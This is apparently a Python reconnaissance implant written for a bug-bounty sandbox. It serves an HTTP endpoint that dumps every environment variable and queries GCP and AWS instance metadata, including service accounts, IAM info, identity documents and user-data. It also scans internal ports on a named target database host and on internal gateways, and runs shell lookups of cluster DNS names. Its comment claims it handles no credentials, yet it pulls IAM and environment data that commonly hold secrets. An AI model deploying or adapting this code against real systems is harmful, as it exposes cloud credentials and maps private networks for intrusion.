#!/usr/bin/env python3
"""envecho v2 — IMDS urllib (SANS curl, alpine n'en a pas) + TCP matrix S50.
Endpoints: /env /tcp /gcp /aws /dns. Connect-only, zéro cred, zéro auth.
"""
import os, socket, json, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

FALCON_IP = "10.1.47.111"
FALCON_HOST = "falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com"

def http_req(url, method="GET", headers=None, t=3):
    try:
        req = urllib.request.Request(url, method=method, headers=headers or {})
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.read(4096).decode(errors="replace").strip()[:800]
    except Exception as e:
        return f"ERR {type(e).__name__}: {e}"

def gcp_meta(path, host="169.254.169.254"):
    return http_req(f"http://{host}/computeMetadata/v1/{path}", headers={"Metadata-Flavor": "Google"})

def aws_imds(path):
    tok = http_req("http://169.254.169.254/latest/api/token", method="PUT",
                   headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"}, t=2)
    if tok and not tok.startswith("ERR"):
        r = http_req(f"http://169.254.169.254/latest/{path}", headers={"X-aws-ec2-metadata-token": tok})
        if not r.startswith("ERR"):
            return r
    return http_req(f"http://169.254.169.254/latest/{path}")

def sh(cmd, t=4):
    import subprocess
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:600]
    except Exception as e:
        return f"ERR {e}"

def tcp(host, port, t=3):
    try:
        s = socket.create_connection((host, port), timeout=t)
        s.close()
        return "OPEN"
    except ConnectionRefusedError:
        return "REFUSED"
    except socket.timeout:
        return "FILTERED"
    except OSError as e:
        return f"ERR {type(e).__name__}"

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "text/plain"); self.end_headers()
        p = self.path
        if p == "/env":
            env = {k: (v[:200] + "...TRUNC" if len(v) > 200 else v) for k, v in sorted(os.environ.items())}
            self.wfile.write(json.dumps(env, indent=1).encode())
        elif p == "/tcp":
            out = {
                "falcon_int_5432": tcp(FALCON_IP, 5432),
                "falcon_int_12691": tcp(FALCON_IP, 12691),
                "falcon_int_12692": tcp(FALCON_IP, 12692),
                "falcon_pub_12691": tcp(FALCON_HOST, 12691),
                "falcon_pub_12692": tcp(FALCON_HOST, 12692),
                "gw_4646_nomad": tcp("10.156.0.1", 4646),
                "meta_80": tcp("169.254.169.254", 80),
                "meta_4646": tcp("169.254.169.254", 4646),
                "gw_80": tcp("10.156.0.1", 80),
                "gw_443": tcp("10.156.0.1", 443),
                "peer_2_4646": tcp("10.156.0.2", 4646),
                "peer_3_4646": tcp("10.156.0.3", 4646),
            }
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/gcp":
            out = {k: gcp_meta(v) for k, v in [
                ("hostname", "instance/hostname"), ("zone", "instance/zone"),
                ("machine_type", "instance/machine-type"),
                ("service_accounts", "instance/service-accounts/"),
                ("network_interfaces", "instance/network-interfaces/"),
                ("project", "project/project-id"),
                ("project_numeric", "project/numeric-project-id"),
                ("instance_name", "instance/name"),
            ]}
            out["alt_host_1_1"] = gcp_meta("instance/zone", host="169.254.1.1")
            out["dns_conf"] = sh("cat /etc/resolv.conf")
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/aws":
            out = {k: aws_imds(v) for k, v in [
                ("hostname", "meta-data/hostname"), ("localips", "meta-data/local-ipv4"),
                ("identity", "dynamic/instance-identity/document"),
                ("iam_info", "meta-data/iam/info"),
                ("userdata", "user-data"),
            ]}
            self.wfile.write(json.dumps(out, indent=1).encode())
        elif p == "/dns":
            out = {
                "srv_nomad": sh("nslookup -type=SRV _nomad._tcp.local 2>&1 | head -5"),
                "falcon_resolve": sh(f"getent hosts {FALCON_HOST}"),
                "cluster_names": sh("getent hosts kubernetes.default; getent hosts nomad.service; getent hosts main.podman"),
                "reverse_gw": sh("getent hosts 10.156.0.1"),
                "reverse_meta": sh("getent hosts 169.254.169.254"),
            }
            self.wfile.write(json.dumps(out, indent=1).encode())
        else:
            self.wfile.write(b"/env /tcp /gcp /aws /dns")
    def log_message(self, *a): pass

HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever()
